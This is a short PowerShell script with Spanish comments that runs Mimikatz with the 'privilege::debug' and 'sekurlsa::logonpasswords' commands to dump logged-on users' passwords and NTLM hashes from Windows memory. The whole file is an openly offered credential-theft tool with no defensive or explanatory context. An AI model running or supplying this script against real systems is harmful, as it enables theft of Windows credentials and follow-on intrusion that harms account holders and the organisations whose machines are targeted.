# mimikatz-extract-hash.ps1
# Ejecuta Mimikatz y extrae hashes NTLM.

# Ruta a Mimikatz
$mimikatzPath = "C:\ruta\a\mimikatz.exe"

# Comandos de Mimikatz
$commands = @(
    "privilege::debug",
    "sekurlsa::logonpasswords"
)

# Ejecutar Mimikatz
Start-Process -FilePath $mimikatzPath -ArgumentList $commands -NoNewWindow -Wait
